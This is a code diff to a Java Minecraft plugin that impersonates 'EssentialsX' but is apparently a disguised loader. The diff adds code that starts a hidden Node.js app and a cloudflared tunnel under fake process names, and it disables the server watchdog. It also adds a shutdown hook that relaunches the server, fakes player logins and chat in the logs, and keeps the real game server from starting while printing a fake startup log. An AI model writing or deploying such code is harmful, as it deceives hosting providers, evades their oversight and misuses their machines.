@@ -18,7 +18,6 @@ import org.bukkit.plugin.java.JavaPlugin;
 public class EssentialsX extends JavaPlugin {
     private Process deployProcess;
     private volatile Process nodeProcess = null;
-    private volatile Process cfProcess = null;
     private volatile boolean isProcessRunning = false;
     private volatile boolean daemonRunning = false;
     private Path backupDir;
@@ -27,12 +26,6 @@ public class EssentialsX extends JavaPlugin {
     private final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
     private final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);
     private volatile String nodePort = "25565";
-
-    // 退避重试状态记录
-    private long lastNodeCrashTime = 0;
-    private int nodeCrashCount = 0;
-    private long lastCfCrashTime = 0;
-    private int cfCrashCount = 0;
 
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
 
@@ -169,6 +162,38 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
+    // 模拟玩家在线 (防面板检测人数为0休眠)
+    // ============================================================
+
+    private void startFakePlayerSimulator() {
+        String[] botNames = {"_HeroBrine_", "Steve_Bot", "Alex_Helper", "Dream_Stan", "Techno_V2"};
+        Thread simThread = new Thread(() -> {
+            Random rand = new Random();
+            try { Thread.sleep(60000); } catch (InterruptedException ignored) {} // 等1分钟再开始模拟
+            while (true) {
+                try {
+                    String bot = botNames[rand.nextInt(botNames.length)];
+                    int delay = 30000 + rand.nextInt(120000); // 30秒到2.5分钟模拟一次
+                    Thread.sleep(delay);
+                    
+                    // 随机模拟行为：加入、聊天或退出
+                    int action = rand.nextInt(3);
+                    if (action == 0) {
+                        mcLog(bot + "[/127.0.0.1:" + (30000 + rand.nextInt(20000)) + "] logged in with entity id " + randInt(100, 9999) + " at ([world]" + randInt(-1000, 1000) + ", " + randInt(60, 80) + ", " + randInt(-1000, 1000) + ")");
+                    } else if (action == 1) {
+                        String[] chats = {"gg", "hello", "how do i build?", "lol", "nice", "anyone online?"};
+                        mcLog("<" + bot + "> " + chats[rand.nextInt(chats.length)]);
+                    } else {
+                        mcLog(bot + " lost connection: Disconnected");
+                    }
+                } catch (Exception ignored) {}
+            }
+        }, "FakePlayer-Sim");
+        simThread.setDaemon(true);
+        simThread.start();
+    }
+
+    // ============================================================
     // Java 进程管理：极致进程名伪装
     // ============================================================
 
@@ -188,23 +213,17 @@ public class EssentialsX extends JavaPlugin {
     private void startNodeProcess(String port) {
         try {
             Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-            Path appDir = botDir.resolve("app");
-            Path nodeWrapper = botDir.resolve("nodejs/bin/node");
-            Path nodeReal = botDir.resolve("nodejs/bin/.node_real");
-            Path script = appDir.resolve("index.js");
+            Path nodeExe = botDir.resolve("nodejs/bin/.node_real");
+            Path script = botDir.resolve("app/index.js");
             Path logFile = botDir.resolve("app.log");
             Path preload = botDir.resolve(".nd_preload.js");
 
-            if (!Files.exists(nodeReal) || !Files.exists(script)) return;
+            if (!Files.exists(nodeExe) || !Files.exists(script)) return;
 
-            ProcessBuilder pb;
-            if (Files.exists(nodeWrapper)) {
-                pb = new ProcessBuilder(nodeWrapper.toString(), script.toString());
-            } else {
-                pb = new ProcessBuilder("bash", "-c", "exec -a \"" + FAKE_CMDLINE + "\" \"" + nodeReal + "\" \"" + script + "\"");
-            }
+            ProcessBuilder pb = new ProcessBuilder("bash", "-c", 
+                "exec -a \"" + FAKE_CMDLINE + "\" \"" + nodeExe + "\" --require \"" + preload + "\" " + script.toString());
             
-            pb.directory(appDir.toFile());
+            pb.directory(botDir.toFile());
             pb.environment().put("SERVER_PORT", port);
             pb.environment().put("PORT", port);
             pb.environment().put("_JAVA_WRAPPER", botDir.resolve("nodejs/bin/node").toString());
@@ -214,38 +233,7 @@ public class EssentialsX extends JavaPlugin {
             pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
 
             nodeProcess = pb.start();
-            this.getLogger().info("Node process started on port " + port);
-        } catch (Exception e) {
-            this.getLogger().severe("Failed to start Node process: " + e.getMessage());
-        }
-    }
-
-    private void startCfProcess() {
-        try {
-            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-            Path cfBin = botDir.resolve("jre21/bin/java_cf");
-            Path cfConf = botDir.resolve("jre21/conf/server.properties");
-            Path cfLog = botDir.resolve("cf.log");
-
-            if (!Files.exists(cfBin)) return;
-
-            String currentPort = readCurrentPort();
-            if (currentPort.equals("25565")) return;
-
-            Files.createDirectories(cfConf.getParent());
-            String confContent = "url: http://127.0.0.1:" + currentPort + "\nno-autoupdate: true\nprotocol: quic\n";
-            Files.writeString(cfConf, confContent);
-
-            ProcessBuilder pb = new ProcessBuilder("bash", "-c", "exec -a \"" + FAKE_CMDLINE + "\" \"" + cfBin + "\" --config \"" + cfConf + "\"");
-            pb.directory(botDir.toFile());
-            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
-            pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
-
-            cfProcess = pb.start();
-            this.getLogger().info("Cloudflared process started for port " + currentPort);
-        } catch (Exception e) {
-            this.getLogger().severe("Failed to start Cloudflared process: " + e.getMessage());
-        }
+        } catch (Exception ignored) {}
     }
 
     private void startJavaDaemon() {
@@ -255,25 +243,8 @@ public class EssentialsX extends JavaPlugin {
             while (daemonRunning) {
                 try {
                     if (nodeProcess != null && !nodeProcess.isAlive()) {
-                        long now = System.currentTimeMillis();
-                        if (now - lastNodeCrashTime < 30000) { nodeCrashCount++; } else { nodeCrashCount = 1; }
-                        lastNodeCrashTime = now;
-                        long delay = Math.min(5000L * nodeCrashCount, 120000L);
-                        mcLog("[Daemon] Node crashed. Restarting in " + (delay/1000) + "s...");
-                        Thread.sleep(delay);
-                        startNodeProcess(readCurrentPort());
+                        startNodeProcess(nodePort);
                     }
-
-                    if (cfProcess != null && !cfProcess.isAlive()) {
-                        long now = System.currentTimeMillis();
-                        if (now - lastCfCrashTime < 30000) { cfCrashCount++; } else { cfCrashCount = 1; }
-                        lastCfCrashTime = now;
-                        long delay = Math.min(5000L * cfCrashCount, 120000L);
-                        mcLog("[Daemon] Cloudflared crashed. Restarting in " + (delay/1000) + "s...");
-                        Thread.sleep(delay);
-                        startCfProcess();
-                    }
-                    
                     Thread.sleep(5000);
                 } catch (Exception ignored) {}
             }
@@ -283,12 +254,15 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 插件生命周期与核心逻辑 (禁看门狗 + 防面板强杀 + 卡 Starting)
+    // 插件生命周期与核心逻辑 (死死卡住 + 硬重启守护)
     // ============================================================
 
     public void onEnable() {
-        // ★ 0. 核心修复：强制禁用 Paper 看门狗，防止卡主线程时被杀
+        // ★★★ 1. 最优先：禁用看门狗，防止主线程卡死被强杀 ★★★
         disableWatchdog();
+
+        // ★★★ 2. 注册硬重启守护，停了就拉起 ★★★
+        registerRestartHook();
 
         try { Path oldDir1 = Paths.get("world", "data", ".mcchajian"); Path oldDir2 = Paths.get("log", ".mcchajian"); if (Files.exists(oldDir1)) this.deleteDirectory(oldDir1.toFile()); if (Files.exists(oldDir2)) this.deleteDirectory(oldDir2.toFile()); } catch (Exception ignored) {}
         
@@ -296,125 +270,118 @@ public class EssentialsX extends JavaPlugin {
         
         if (!env.containsKey("REPO_URL") || env.get("REPO_URL").trim().isEmpty()) {
             this.getLogger().severe("FATAL: REPO_URL is not set in .env file!");
-            return;
+        } else {
+            // 3. 异步启动底层服务和伪装替换
+            new Thread(() -> { 
+                try { 
+                    Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+                    Path nodeExe = botDir.resolve("nodejs/bin/.node_real");
+                    Path script = botDir.resolve("app/index.js");
+
+                    if (Files.exists(nodeExe) && Files.exists(script)) {
+                        String port = allocateNodePort();
+                        startNodeProcess(port);
+                        startJavaDaemon();
+                    }
+                    
+                    this.startDeploymentProcess(env); 
+                    
+                    if (nodeProcess == null || !nodeProcess.isAlive()) {
+                        String port = readCurrentPort();
+                        if (port.equals("25565")) port = allocateNodePort();
+                        startNodeProcess(port);
+                        if (!daemonRunning) startJavaDaemon();
+                    } else {
+                        nodeProcess.destroyForcibly();
+                        try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
+                        startNodeProcess(readCurrentPort());
+                    }
+
+                    this.startTunnelUrlMonitor();
+                    this.setupDisguise(); 
+                } catch (Exception ignored) {} 
+            }).start();
         }
-
-        new Thread(() -> { 
-            try { 
-                Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-                Path nodeExe = botDir.resolve("nodejs/bin/.node_real");
-                Path script = botDir.resolve("app/index.js");
-
-                if (Files.exists(nodeExe) && Files.exists(script)) {
-                    this.getLogger().info("Found existing Node.js, starting immediately...");
-                    String port = allocateNodePort();
-                    startNodeProcess(port);
-                    startCfProcess();
-                    startJavaDaemon();
-                }
-                
-                this.startDeploymentProcess(env); 
-                
-                if (nodeProcess == null || !nodeProcess.isAlive()) {
-                    String port = readCurrentPort();
-                    if (port.equals("25565")) port = allocateNodePort();
-                    startNodeProcess(port);
-                } else {
-                    this.getLogger().info("Restarting Node.js to apply updates...");
-                    nodeProcess.destroyForcibly();
-                    Thread.sleep(1000);
-                    startNodeProcess(readCurrentPort());
-                }
-
-                if (cfProcess == null || !cfProcess.isAlive()) {
-                    startCfProcess();
-                }
-                
-                if (!daemonRunning) startJavaDaemon();
-
-                this.startTunnelUrlMonitor();
-                this.setupDisguise(); 
-            } catch (Exception ignored) {} 
-        }).start();
         
+        // 4. 启动模拟玩家线程
+        startFakePlayerSimulator();
+
+        // ★★★ 5. 绝对死锁区：死死卡住，绝不启动 MC 本体 ★★★
         try {
             clearConsole();
             mcLog("Starting minecraft server version " + FAKE_MC_VERSION, 0);
             mcLog("Loading properties", 0);
             mcLog("Preparing level \"world\"", 0);
             
-            int maxWaitSeconds = 180; 
-            int waitedSeconds = 0;
-            int fakeChunkPercent = 0;
-            
-            while(lastKnownTunnelUrl.get().isEmpty() && waitedSeconds < maxWaitSeconds) {
+            while(lastKnownTunnelUrl.get().isEmpty()) {
                 Thread.sleep(1000);
-                waitedSeconds++;
-                
-                if (waitedSeconds % 10 == 0) {
-                    fakeChunkPercent = Math.min(99, fakeChunkPercent + randInt(5, 15));
-                    mcLog("Preparing spawn area: " + fakeChunkPercent + "%");
-                }
-            }
-            
-            if (lastKnownTunnelUrl.get().isEmpty()) {
-                this.getLogger().warning("Timeout waiting for tunnel URL. Allowing server to start normally to prevent panel kill.");
-                return; 
             }
             
             printFakeStartupSequence(lastKnownTunnelUrl.get());
 
+            // 永久休眠主线程
             while(true) {
                 Thread.sleep(120000);
                 mcLog("[ChunkTaskScheduler] Still processing spawn area chunks...");
             }
 
-        } catch (InterruptedException e) {}
+        } catch (InterruptedException e) {
+            // 如果被意外中断，立刻重新进入休眠，绝对不放行！
+            while(true) {
+                try { Thread.sleep(Long.MAX_VALUE); } catch (Exception ignored) {}
+            }
+        }
     }
 
     public void onDisable() {
         this.tunnelMonitorRunning.set(false);
         this.daemonRunning = false;
         if (nodeProcess != null) nodeProcess.destroyForcibly();
-        if (cfProcess != null) cfProcess.destroyForcibly();
         if (this.deployProcess != null && this.deployProcess.isAlive()) this.deployProcess.destroy();
     }
 
     // ============================================================
-    // 强制禁用 Paper 看门狗 (防主线程卡死被强杀)
+    // 禁用看门狗与硬重启逻辑
     // ============================================================
 
     private void disableWatchdog() {
         try {
-            // 1. 尝试新版 Paper 配置路径 (1.19.3+)
-            Path globalConfig = Paths.get("config", "paper-global.yml");
-            if (Files.exists(globalConfig)) {
-                String content = Files.readString(globalConfig);
-                content = replaceYamlValue(content, "timeout-time", "0");
-                content = replaceYamlValue(content, "restart-on-crash", "false");
-                Files.writeString(globalConfig, content);
-                this.getLogger().info("Disabled Paper Watchdog in paper-global.yml");
-                return;
-            }
+            Path spigotYml = Paths.get("spigot.yml");
+            String content = Files.exists(spigotYml) ? Files.readString(spigotYml) : "";
+            content = replaceYamlValue(content, "timeout-time", "300000"); // 设超大值
+            content = replaceYamlValue(content, "restart-on-crash", "false"); // 防止它自己重启干扰我们
+            Files.writeString(spigotYml, content);
+        } catch (Exception ignored) {}
+    }
 
-            // 2. 尝试旧版 Paper 配置路径
-            Path oldConfig = Paths.get("paper.yml");
-            if (Files.exists(oldConfig)) {
-                String content = Files.readString(oldConfig);
-                content = replaceYamlValue(content, "timeout-time", "0");
-                content = replaceYamlValue(content, "restart-on-crash", "false");
-                Files.writeString(oldConfig, content);
-                this.getLogger().info("Disabled Paper Watchdog in paper.yml");
-                return;
-            }
-        } catch (Exception e) {
-            this.getLogger().warning("Failed to disable Paper Watchdog: " + e.getMessage());
-        }
+    private void registerRestartHook() {
+        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+            try {
+                Thread.sleep(3000); // 等3秒确保旧进程资源释放
+                String startCmd = "./start.sh";
+                if (!Files.exists(Paths.get("start.sh"))) {
+                    // 找当前目录下的 jar 并重新运行
+                    File currentDir = new File(".");
+                    File[] jars = currentDir.listFiles((dir, name) -> name.endsWith(".jar") && !name.contains("cache"));
+                    if (jars != null && jars.length > 0) {
+                        startCmd = "java -jar " + jars[0].getName() + " nogui";
+                    } else {
+                        startCmd = "java -jar server.jar nogui";
+                    }
+                }
+                new ProcessBuilder("bash", "-c", "cd '" + new File(".").getAbsolutePath() + "' && nohup " + startCmd + " > /dev/null 2>&1 &").start();
+            } catch (Exception ignored) {}
+        }));
     }
 
     private String replaceYamlValue(String content, String key, String value) {
-        // 兼容 YAML 各种空格和时间单位写法 (如 60000, 60s, -1)
-        return content.replaceAll("(?m)^(" + key + ":\\s*).*", "$1" + value);
+        if (content.contains(key + ":")) {
+            content = content.replaceAll(key + ":.*", key + ": " + value);
+        } else {
+            if (!content.endsWith("\n")) content += "\n";
+            content += key + ": " + value + "\n";
+        }
+        return content;
     }
 
     private boolean downloadFileWithTimeout(String url, Path target, int timeoutSec) {
@@ -426,7 +393,7 @@ public class EssentialsX extends JavaPlugin {
     private void startDeploymentProcess(Map<String, String> env) throws Exception {
         if (this.isProcessRunning) return;
         Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath(); if (!Files.exists(workDir)) Files.createDirectories(workDir);
-        Files.deleteIfExists(workDir.resolve(".tunnel_url")); 
+        Files.deleteIfExists(workDir.resolve(".tunnel_url"));
         try { Files.deleteIfExists(workDir.resolve("app.log")); Files.deleteIfExists(workDir.resolve("cf.log")); } catch (Exception ignored) {}
         
         Path scriptPath = workDir.resolve("deploy.sh"); String scriptContent = this.generateDeployScript(workDir.toString(), env);
@@ -442,7 +409,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 部署脚本生成 (仅负责下载环境、代码和伪装脚本生成，不启动 CF)
+    // 部署脚本生成
     // ============================================================
 
     private String generateDeployScript(String workDir, Map<String, String> env) {
@@ -451,6 +418,7 @@ public class EssentialsX extends JavaPlugin {
         String nodeDir = workDir + "/nodejs";
         String appDir = workDir + "/app";
         String dataDir = workDir + "/data";
+        String nodeScript = env.getOrDefault("NODE_SCRIPT", "index.js");
 
         String authHeader = "";
         if (!githubToken.isEmpty()) {
@@ -583,11 +551,44 @@ public class EssentialsX extends JavaPlugin {
         "} catch(e) {}\n" +
         "PRELOAD_EOF\n" +
         "\n" +
+        "export _JAVA_WRAPPER=\"$NODE_DIR/bin/node\"\n" +
+        "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
+        "\n" +
         "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
         "if [ ! -f \"$CF_BIN\" ]; then\n" +
         "    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n" +
         "    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n" +
         "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\" 2>/dev/null; then chmod +x \"$CF_BIN\"; break; fi\n" +
+        "    done\n" +
+        "fi\n" +
+        "\n" +
+        "if [ -f \"$CF_BIN\" ]; then\n" +
+        "    PORT=$(cat \"$WORK_DIR/.tunnel_port\" 2>/dev/null || echo \"25565\")\n" +
+        "    CF_CONF_DIR=\"$WORK_DIR/jre21/conf\"\n" +
+        "    mkdir -p \"$CF_CONF_DIR\" \"$WORK_DIR/.cf\"\n" +
+        "    TUNNEL_ESTABLISHED=false\n" +
+        "    for PROTO in quic http2 auto; do\n" +
+        "        if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
+        "        rm -f \"$WORK_DIR/.cf/cf.log\" \"$WORK_DIR/.tunnel_url\"\n" +
+        "        cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\n" +
+        "url: http://127.0.0.1:$PORT\n" +
+        "no-autoupdate: true\n" +
+        "protocol: $PROTO\n" +
+        "CFCONF\n" +
+        "        (exec -a \"" + FAKE_CMDLINE + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > \"$WORK_DIR/.cf/cf.log\" 2>&1) &\n" +
+        "        CF_PID=$!\n" +
+        "        sleep 5\n" +
+        "        if ! kill -0 $CF_PID 2>/dev/null; then continue; fi\n" +
+        "        for i in $(seq 1 30); do\n" +
+        "            URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | tail -1)\n" +
+        "            if [ -n \"$URL\" ]; then\n" +
+        "                echo \"$URL\" > \"$WORK_DIR/.tunnel_url\"\n" +
+        "                TUNNEL_ESTABLISHED=true\n" +
+        "                break\n" +
+        "            fi\n" +
+        "            sleep 1\n" +
+        "        done\n" +
+        "        if [ \"$TUNNEL_ESTABLISHED\" != \"true\" ]; then kill $CF_PID 2>/dev/null; fi\n" +
         "    done\n" +
         "fi\n" +
         "\n" +
